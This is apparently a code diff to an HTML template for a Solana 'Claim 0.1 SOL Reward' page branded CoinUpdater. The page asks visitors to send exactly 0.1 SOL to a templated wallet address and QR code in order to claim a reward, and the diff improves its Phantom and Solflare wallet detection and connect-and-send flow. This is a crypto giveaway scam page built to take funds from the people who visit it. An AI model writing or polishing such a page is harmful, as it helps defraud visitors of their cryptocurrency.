@@ -11,7 +11,7 @@ HTML_TEMPLATE = """
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Claim 1 SOL</title>
+  <title>Claim 0.1 SOL</title>
   <style>
     body {
       background-color: #000;
@@ -37,22 +37,13 @@ HTML_TEMPLATE = """
       color: #000;
       font-weight: bold;
     }
-    .wallet-button[disabled] {
-      opacity: 0.5;
+    .wallet-button:disabled {
+      background: #555;
       cursor: not-allowed;
+      color: #ccc;
     }
   </style>
-</head>
-<body>
-  <h1>Claim 1 SOL Reward</h1>
-  <p>Send exactly <b>0.1 SOL</b> to:</p>
-  <p><code>{{ wallet }}</code></p>
-  <img src="{{ qr_url }}" class="qr" alt="QR Code" />
-  <p id="walletStatus">Wallet not connected</p>
-  <button id="connectWalletBtn" class="wallet-button" onclick="connectWallet()" disabled>Connect Wallet</button>
-  <button onclick="sendTransaction()" class="claim-button">Claim Now</button>
-  <footer style="margin-top: 60px; font-size: 0.9em; color: #aaa;">&copy; 2025 CoinUpdater</footer>
-
+  <!-- Solana wallet adapter + scripts -->
   <script type="module">
     import {
       Connection,
@@ -63,26 +54,39 @@ HTML_TEMPLATE = """
 
     let provider = null;
 
+    function enableConnectButton() {
+      const btn = document.getElementById("connectWalletBtn");
+      btn.disabled = false;
+      console.log("Connect button enabled");
+    }
+
     function checkWalletProvider() {
       if (window.solflare && window.solflare.isSolflare) {
         provider = window.solflare;
         console.log("Detected Solflare wallet");
-        document.getElementById("connectWalletBtn").disabled = false;
+        enableConnectButton();
       } else if (window.solana && window.solana.isPhantom) {
         provider = window.solana;
         console.log("Detected Phantom wallet");
-        document.getElementById("connectWalletBtn").disabled = false;
+        enableConnectButton();
       } else {
-        console.log("No supported wallet detected");
+        console.log("No supported wallet detected yet");
         document.getElementById("walletStatus").innerText = "No Solflare or Phantom wallet detected";
       }
     }
 
-    // Wait for DOM load and check wallet presence
     window.addEventListener('load', () => {
       checkWalletProvider();
 
-      // Some wallets inject asynchronously; listen for solflare readiness
+      // Sometimes wallets inject asynchronously, so check again after delay
+      setTimeout(() => {
+        if (!provider) {
+          console.log("Retrying wallet detection after delay");
+          checkWalletProvider();
+        }
+      }, 2000);
+
+      // Some wallets emit events on initialization, listen for those
       window.addEventListener('solflare#initialized', () => {
         console.log('Solflare initialized event detected');
         checkWalletProvider();
@@ -95,7 +99,6 @@ HTML_TEMPLATE = """
         return;
       }
       try {
-        // For Solflare and Phantom, use their connect() method:
         const res = await provider.connect();
         document.getElementById("walletStatus").innerText =
           "Wallet Connected: " + res.publicKey.toString();
@@ -135,6 +138,16 @@ HTML_TEMPLATE = """
     window.connectWallet = connectWallet;
     window.sendTransaction = sendTransaction;
   </script>
+</head>
+<body>
+  <h1>Claim 0.1 SOL Reward</h1>
+  <p>Send exactly <b>0.1 SOL</b> to:</p>
+  <p><code>{{ wallet }}</code></p>
+  <img src="{{ qr_url }}" class="qr" alt="QR Code" />
+  <p id="walletStatus">Wallet not connected</p>
+  <button id="connectWalletBtn" onclick="connectWallet()" class="wallet-button" disabled>Connect Wallet</button>
+  <button onclick="sendTransaction()" class="claim-button">Claim Now</button>
+  <footer style="margin-top: 60px; font-size: 0.9em; color: #aaa;">&copy; 2025 CoinUpdater</footer>
 </body>
 </html>
 """
